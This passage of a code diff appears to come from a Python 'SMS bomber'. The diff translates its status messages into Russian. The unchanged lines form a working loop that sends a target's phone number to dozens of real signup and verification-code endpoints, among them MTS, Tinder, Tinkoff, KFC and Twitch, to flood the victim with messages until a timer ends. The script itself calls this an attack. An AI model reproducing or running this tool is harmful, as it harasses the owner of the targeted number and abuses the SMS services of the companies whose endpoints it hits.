             requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
@@ -1698,10 +1698,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.delitime.ru/api/v2/signup",
@@ -1710,14 +1710,14 @@ if call == str(2):
             print('[+] Delitime отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://guru.taxi/api/v1/driver/session/verify",
@@ -1726,10 +1726,10 @@ if call == str(2):
             print('[+] Guru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
@@ -1739,10 +1739,10 @@ if call == str(2):
             print('[+] ICQ отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
@@ -1752,10 +1752,10 @@ if call == str(2):
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -1764,10 +1764,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
@@ -1775,10 +1775,10 @@ if call == str(2):
             print('[+] Pmsm отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
@@ -1786,10 +1786,10 @@ if call == str(2):
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
@@ -1797,10 +1797,10 @@ if call == str(2):
             print('[+] Lenta отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink',
@@ -1809,10 +1809,10 @@ if call == str(2):
             print('[+] Mail.ru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -1822,10 +1822,10 @@ if call == str(2):
             print('[+] MVideo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
@@ -1834,10 +1834,10 @@ if call == str(2):
             print('[+] OK отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
@@ -1845,10 +1845,10 @@ if call == str(2):
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
@@ -1858,10 +1858,10 @@ if call == str(2):
             print('[+] Qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
@@ -1869,10 +1869,10 @@ if call == str(2):
             print('[+] SMSgorod отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -1880,21 +1880,21 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено! || Кол-во - ' + str(R))
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
             R = R + 1
             print('[+] BelkaCar отправлено|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -1902,55 +1902,55 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
             R = R + 1
             print('[+] Karusel отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
             R = R + 1
             print('[+] Tinkoff отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
             R = R + 1
             print('[+] MTS отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://pizzahut.ru/account/password-reset',
@@ -1959,22 +1959,22 @@ if call == str(2):
             R = R + 1
             print('[+] PizzaHut отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
             R = R + 1
             print('[+] Rabota отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
@@ -1986,7 +1986,7 @@ if call == str(2):
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
@@ -1994,11 +1994,11 @@ if call == str(2):
             R = R + 1
             print('[+] Smsint отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get(
@@ -2006,11 +2006,11 @@ if call == str(2):
             R = R + 1
             print('[+] oyorooms отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post(
@@ -2021,11 +2021,11 @@ if call == str(2):
             R = R + 1
             print('[+] MVideo отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
@@ -2034,22 +2034,22 @@ if call == str(2):
             R = R + 1
             print('[+] newnext отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
             R = R + 1
             print('[+] Sunlight отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -2058,22 +2058,22 @@ if call == str(2):
             R = R + 1
             print('[+] alpari отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
             R = R + 1
             print('[+] Invitro отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://online.sbis.ru/reg/service/',
@@ -2082,11 +2082,11 @@ if call == str(2):
             R = R + 1
             print('[+] Sberbank отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
@@ -2098,44 +2098,44 @@ if call == str(2):
             R = R + 1
             print('[+] Psbank отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
             R = R + 1
             print('[+] Beltelcom отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
             R = R + 1
             print('[+] KFC отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.carsmile.com/",
@@ -2144,22 +2144,22 @@ if call == str(2):
             R = R + 1
             print('[+] carsmile отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
             R = R + 1
             print('[+] Citilink отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.delitime.ru/api/v2/signup",
@@ -2167,11 +2167,11 @@ if call == str(2):
             R = R + 1
             print('[+] Delitime отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://guru.taxi/api/v1/driver/session/verify",
@@ -2179,11 +2179,11 @@ if call == str(2):
             R = R + 1
             print('[+] Guru отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
@@ -2192,11 +2192,11 @@ if call == str(2):
             R = R + 1
             print('[+] ICQ отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
@@ -2205,11 +2205,11 @@ if call == str(2):
             R = R + 1
             print('[+] InDriver отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -2217,33 +2217,33 @@ if call == str(2):
             R = R + 1
             print('[+] Invitro отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Pmsm отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
             R = R + 1
             print('[+] IVI отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
@@ -2251,11 +2251,11 @@ if call == str(2):
             R = R + 1
             print('[+] Lenta отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink',
@@ -2263,11 +2263,11 @@ if call == str(2):
             R = R + 1
             print('[+] Mail.ru отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -2276,11 +2276,11 @@ if call == str(2):
             R = R + 1
             print('[+] MVideo отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
@@ -2288,44 +2288,44 @@ if call == str(2):
             R = R + 1
             print('[+] OK отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://plink.tech/register/', json={"phone": _phone})
             R = R + 1
             print('[+] Plink отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
             R = R + 1
             print('[+] qlean отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -2333,11 +2333,11 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://passport.twitch.tv/register?trusted_request=true',
@@ -2347,11 +2347,11 @@ if call == str(2):
             R = R + 1
             print('[+] Twitch отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
@@ -2359,10 +2359,10 @@ if call == str(2):
             R = R + 1
             print('[+] CabWiFi отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -2370,11 +2370,11 @@ if call == str(2):
             R = R + 1
             print('[+] wowworks отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -2383,22 +2383,22 @@ if call == str(2):
             R = R + 1
             print('[+] Eda.Yandex отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla отправлено! || Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -2408,33 +2408,33 @@ if call == str(2):
             R = R + 1
             print('[+] Alpari отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
             R = R + 1
             print('[+] SMS отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
             R = R + 1
             print('[+] Delivery отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://passport.twitch.tv/register?trusted_request=true',
@@ -2445,10 +2445,10 @@ if call == str(2):
             print('[+] Twitch отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
